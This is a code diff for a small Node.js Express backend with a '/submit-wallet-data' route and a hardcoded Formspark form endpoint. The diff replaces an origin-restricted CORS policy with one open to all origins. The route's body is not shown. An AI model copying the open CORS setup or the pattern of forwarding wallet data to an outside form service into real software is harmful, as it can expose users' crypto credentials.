@@ -3,14 +3,11 @@ import cors from 'cors';
 import fetch from 'node-fetch'; 
 
 const app = express();
+const port = 5000;
 
 const FORMSPARK_ENDPOINT_URL = 'https://submit-form.com/EUSRpXCa2';
 
-app.use(cors({
-    origin: 'https://flareproject.vercel.app', 
-    methods: ['GET', 'POST'],
-    allowedHeaders: ['Content-Type', 'Authorization']
-}));
+app.use(cors());
 app.use(express.json());
 
 app.post('/submit-wallet-data', async (req, res) => {
@@ -70,4 +67,6 @@ app.get('/', (req, res) => {
     res.send('Node.js Backend is running!');
 });
 
-export default app;
+app.listen(port, () => {
+    console.log(`Node.js backend listening at http://localhost:${port}`);
+});
